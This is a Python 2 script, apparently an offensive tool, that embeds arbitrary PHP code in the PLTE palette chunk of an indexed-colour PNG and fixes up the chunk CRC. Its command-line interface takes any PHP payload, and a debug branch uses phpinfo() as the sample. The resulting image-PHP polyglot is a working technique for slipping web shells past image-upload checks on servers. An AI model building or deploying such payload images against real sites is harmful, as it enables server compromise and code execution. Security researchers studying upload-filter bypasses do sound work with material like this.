# -*- coding: utf-8 -*-

"""
author: janes
"""

import binascii


class PNGError(Exception):

    def __init__(self, value):
        self.value = value

    def __str__(self):
        return repr(self.value)


class PNG(object):
    """
    read png file and modify png data to php code, just support index-color
    images.
    """

    def __init__(self, fname=None):
        if fname:
            self.openpng(fname)

    def openpng(self, fname):
        try:
            with open(fname, 'rb') as f:
                self.data = f.read()
        except:
            err_msg = "open {f} failed".format(f=fname)
            raise PNGError(err_msg)
            
        self.read_info()

    def read_info(self):
        try:
            self.signature = self.data[:8]
            self.depth = self.data[0x18]
            self.color_type = self.data[0x19]
        except:
            raise PNGError('invalid png data')

        if not self.check_signature():
            raise PNGError('check png signature error')
        if not self.check_type():
            raise PNGError('just support index-color images')
        if not self.check_plte():
            raise PNGError('check PLTE chunk error')

        pos = self.data.find('PLTE')
        self.plte_len = int(self.data[pos-4: pos].encode('hex'), 16)
        self.plte_pos = pos-4

    def check_signature(self):
        return self.signature == '89504e470d0a1a0a'.decode('hex')

    def check_type(self):
        return self.color_type == '03'.decode('hex')

    def check_plte(self):
        return self.data.find('PLTE') != -1

    def set_payload(self, payload):
        """
        set php code payload
        """
        code_len = len(payload)
        if code_len > self.depth*3:
            err_msg = "payload is too long, can't to add to png PLTE chunk"
            raise PNGError(err_msg)
        self.payload = payload

    def check_payload(self):
        return len(self.payload) <= self.plte_len

    def crc(self, data):
        return '%08x' % (binascii.crc32(data) & 0xffffffff)

    def modify_plte(self):
        if self.check_payload():
            im = list(self.data)
            payload_pos = self.plte_pos + 8
            # modify data to php code
            for i in range(len(self.payload)):
                im[payload_pos+i] = self.payload[i]

            crc_pos = self.plte_pos + 8 + self.plte_len
            crc_checks = self.crc(''.join(im[self.plte_pos+4: crc_pos]))
            crc_checks = crc_checks.decode('hex')
            # modify crc
            for i in range(4):
                im[crc_pos+i] = crc_checks[i]
            self.im = ''.join(im)
        else:
            code_len = len(self.payload)            # must be a multiple of 3
            add_len = code_len % 3
            if add_len:
                add_len = 3 - add_len
                
            plte_len = ('%08x' % (code_len+add_len)).decode('hex')
            plte_type = 'PLTE'
            plte_data = self.payload + ' ' * add_len
            plte_crc = self.crc(plte_type+plte_data).decode('hex')
            plte_chunk = plte_len + plte_type + plte_data + plte_crc

            im = self.data[:self.plte_pos]
            im += plte_chunk
            im += self.data[(self.plte_pos+12+self.plte_len):]
            self.im = im

    def save(self, imfile):
        with open(imfile, 'wb') as f:
            f.write(self.im)

if __name__ == "__main__":
    debug = 0
    if debug:
        info_code = '<?php phpinfo();?>'

        php_code = info_code
        php_png = 'php_long.png'
        png_file = 'test.png'
    else:
        import argparse

        parser = argparse.ArgumentParser()
        parser.add_argument('in_file', help='input png file')
        parser.add_argument('-p', dest='payload',
                help='php code to add to PLTE chunk', required=True)
        parser.add_argument('-o', dest="out_file", default='php.png',
                help='output png file, default is php.png')
        args = parser.parse_args()

        png_file = args.in_file
        php_code = args.payload
        php_png = args.out_file

    try:
        png = PNG()
        png.openpng(png_file)
        png.set_payload(php_code)
        png.modify_plte()
        png.save(php_png)
    except PNGError as e:
        print "Error massage: {}".format(e.value)
